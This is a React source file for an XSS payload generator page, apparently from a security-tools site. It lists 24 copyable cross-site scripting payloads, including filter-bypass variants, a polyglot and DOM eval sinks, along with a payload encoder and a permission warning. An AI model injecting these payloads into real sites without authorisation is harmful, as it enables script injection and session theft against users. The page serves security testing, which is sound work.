"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Code, Copy, Check, Search, AlertTriangle } from 'lucide-react';
import ToolPageLayout from '@/components/ui/ToolPageLayout';

type Category = 'all' | 'basic' | 'event' | 'filter-bypass' | 'polyglot' | 'dom';

interface Payload {
    id: string;
    name: string;
    payload: string;
    description: string;
    category: Exclude<Category, 'all'>;
}

const payloads: Payload[] = [
    { id: '1', name: 'Basic Script Alert', payload: '<script>alert(1)</script>', description: 'Classic XSS test payload', category: 'basic' },
    { id: '2', name: 'Script with Document', payload: '<script>alert(document.domain)</script>', description: 'Shows current domain', category: 'basic' },
    { id: '3', name: 'Script Cookie Steal', payload: '<script>alert(document.cookie)</script>', description: 'Display cookies (for testing)', category: 'basic' },
    { id: '4', name: 'IMG Onerror', payload: '<img src=x onerror=alert(1)>', description: 'Image error event handler', category: 'event' },
    { id: '5', name: 'SVG Onload', payload: '<svg onload=alert(1)>', description: 'SVG load event', category: 'event' },
    { id: '6', name: 'Body Onload', payload: '<body onload=alert(1)>', description: 'Body load event', category: 'event' },
    { id: '7', name: 'Input Onfocus', payload: '<input onfocus=alert(1) autofocus>', description: 'Auto-focusing input', category: 'event' },
    { id: '8', name: 'Marquee Onstart', payload: '<marquee onstart=alert(1)>', description: 'Marquee start event', category: 'event' },
    { id: '9', name: 'Details Ontoggle', payload: '<details open ontoggle=alert(1)>', description: 'Details toggle event', category: 'event' },
    { id: '10', name: 'Video Onerror', payload: '<video><source onerror=alert(1)>', description: 'Video source error', category: 'event' },
    { id: '11', name: 'Case Variation', payload: '<ScRiPt>alert(1)</sCrIpT>', description: 'Mixed case to bypass filters', category: 'filter-bypass' },
    { id: '12', name: 'Double Encoding', payload: '%253Cscript%253Ealert(1)%253C/script%253E', description: 'Double URL encoded', category: 'filter-bypass' },
    { id: '13', name: 'Null Byte', payload: '<scr%00ipt>alert(1)</scr%00ipt>', description: 'Null byte injection', category: 'filter-bypass' },
    { id: '14', name: 'HTML Entities', payload: '&lt;script&gt;alert(1)&lt;/script&gt;', description: 'HTML entity encoded', category: 'filter-bypass' },
    { id: '15', name: 'Unicode Escape', payload: '<script>\\u0061lert(1)</script>', description: 'Unicode escaped characters', category: 'filter-bypass' },
    { id: '16', name: 'No Quotes', payload: '<img src=x onerror=alert`1`>', description: 'Template literals instead of parentheses', category: 'filter-bypass' },
    { id: '17', name: 'SVG/Animate', payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', description: 'SVG animate element', category: 'filter-bypass' },
    { id: '18', name: 'Polyglot Basic', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', description: 'Works in multiple contexts', category: 'polyglot' },
    { id: '19', name: 'Polyglot Short', payload: '\'-alert(1)-\'', description: 'Short polyglot for attribute context', category: 'polyglot' },
    { id: '20', name: 'Polyglot Medium', payload: '"><img src=x onerror=alert(1)>//', description: 'Break out of attribute and tag', category: 'polyglot' },
    { id: '21', name: 'Location Hash', payload: '<script>eval(location.hash.slice(1))</script>', description: 'Execute code from URL hash', category: 'dom' },
    { id: '22', name: 'Document Write', payload: '<script>document.write("<img src=x onerror=alert(1)>")</script>', description: 'DOM manipulation via document.write', category: 'dom' },
    { id: '23', name: 'InnerHTML', payload: '<div id=x></div><script>x.innerHTML="<img src=x onerror=alert(1)>"</script>', description: 'innerHTML injection', category: 'dom' },
    { id: '24', name: 'PostMessage', payload: '<script>window.addEventListener("message",function(e){eval(e.data)})</script>', description: 'PostMessage handler exploitation', category: 'dom' },
];

const categoryLabels: Record<Category, string> = {
    'all': 'All Payloads',
    'basic': 'Basic',
    'event': 'Event Handlers',
    'filter-bypass': 'Filter Bypass',
    'polyglot': 'Polyglot',
    'dom': 'DOM-based'
};

const XSSPayloadsPage = () => {
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [selectedCategory, setSelectedCategory] = useState<Category>('all');
    const [copiedId, setCopiedId] = useState<string | null>(null);
    const [customPayload, setCustomPayload] = useState('');

    const filteredPayloads = payloads.filter(p => {
        const matchesSearch = p.name.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.payload.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.description.toLowerCase().includes(debouncedSearch.toLowerCase());
        const matchesCategory = selectedCategory === 'all' || p.category === selectedCategory;
        return matchesSearch && matchesCategory;
    });

    const copyToClipboard = (id: string, text: string) => {
        navigator.clipboard.writeText(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(null), 2000);
    };

    const encodePayload = (payload: string, type: 'url' | 'html' | 'base64') => {
        switch (type) {
            case 'url': return encodeURIComponent(payload);
            case 'html': return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
            case 'base64': return btoa(payload);
            default: return payload;
        }
    };

    return (
        <ToolPageLayout
            title="XSS Payload Generator"
            description="Collection of XSS payloads for security testing and bug bounty hunting."
            icon={Code}
            badge="Web Security Tool"
            tags={[
                { label: 'Bug Bounty', color: 'bg-red-500/10 text-red-400 border-red-500/30' },
                { label: 'Web Security', color: 'bg-blue-500/10 text-blue-400 border-blue-500/30' },
            ]}
        >
            {/* Warning */}
            <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/20">
                <div className="flex items-start gap-3">
                    <AlertTriangle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                    <div>
                        <p className="text-red-400 font-medium text-sm">Security Testing Only</p>
                        <p className="text-red-500/80 text-sm mt-1">
                            Only use these payloads on systems you have explicit permission to test.
                        </p>
                    </div>
                </div>
            </div>

            {/* Custom Payload Encoder */}
            <div className="mb-8 p-5 rounded-xl border border-white/10 bg-white/[0.02]">
                <h2 className="text-white font-medium mb-4">Custom Payload Encoder</h2>
                <textarea
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    placeholder="<script>alert(1)</script>"
                    rows={2}
                    className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-600 focus:border-orange-500/50 focus:outline-none transition-colors font-mono text-sm resize-none"
                />
                {customPayload && (
                    <div className="grid sm:grid-cols-3 gap-3 mt-4">
                        {(['url', 'html', 'base64'] as const).map((type) => (
                            <div key={type} className="p-3 rounded-lg bg-black/30 border border-white/5">
                                <div className="flex items-center justify-between mb-2">
                                    <span className="text-xs text-gray-500 capitalize">{type} Encoded</span>
                                    <button onClick={() => copyToClipboard(type, encodePayload(customPayload, type))} className="p-1 hover:bg-white/10 rounded">
                                        {copiedId === type ? <Check className="w-3 h-3 text-green-500" /> : <Copy className="w-3 h-3 text-gray-500" />}
                                    </button>
                                </div>
                                <code className="text-xs text-orange-400 break-all">{encodePayload(customPayload, type)}</code>
                            </div>
                        ))}
                    </div>
                )}
            </div>

            {/* Search and Filter */}
            <div className="flex flex-col sm:flex-row gap-3 mb-6">
                <div className="relative flex-1">
                    <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                    <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="Search payloads..."
                        className="w-full pl-11 pr-4 py-2.5 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-600 focus:border-orange-500/50 focus:outline-none" />
                </div>
                <div className="flex gap-2 overflow-x-auto snap-x snap-mandatory pb-2 sm:pb-0 scrollbar-hide">
                    {(Object.keys(categoryLabels) as Category[]).map((cat) => (
                        <button key={cat} onClick={() => setSelectedCategory(cat)}
                            className={`px-3 py-2 rounded-lg text-sm font-medium whitespace-nowrap shrink-0 snap-start transition-all ${selectedCategory === cat ? 'bg-orange-500 text-white' : 'bg-white/5 text-gray-400 hover:text-white border border-white/10'}`}>
                            {categoryLabels[cat]}
                        </button>
                    ))}
                </div>
            </div>

            {/* Payloads List */}
            <div className="space-y-3">
                {filteredPayloads.map((p) => (
                    <div key={p.id} className="p-4 rounded-xl border border-white/10 bg-white/[0.02] hover:border-white/20 transition-colors">
                        <div className="flex items-start justify-between gap-4">
                            <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2 mb-1">
                                    <h3 className="text-white font-medium text-sm">{p.name}</h3>
                                    <span className="px-2 py-0.5 text-xs rounded-full bg-white/5 text-gray-500 border border-white/10">{categoryLabels[p.category]}</span>
                                </div>
                                <p className="text-xs text-gray-500 mb-3">{p.description}</p>
                                <code className="block text-sm text-orange-400 bg-black/50 px-3 py-2 rounded-lg overflow-x-auto">{p.payload}</code>
                            </div>
                            <button onClick={() => copyToClipboard(p.id, p.payload)} className="p-2 rounded-lg border border-white/10 hover:border-white/20 text-gray-400 hover:text-white transition-colors flex-shrink-0">
                                {copiedId === p.id ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
                            </button>
                        </div>
                    </div>
                ))}
            </div>

            {filteredPayloads.length === 0 && (
                <div className="text-center py-12">
                    <Code className="w-12 h-12 text-gray-600 mx-auto mb-4" />
                    <p className="text-gray-400">No payloads found</p>
                </div>
            )}
        </ToolPageLayout>
    );
};

export default XSSPayloadsPage;
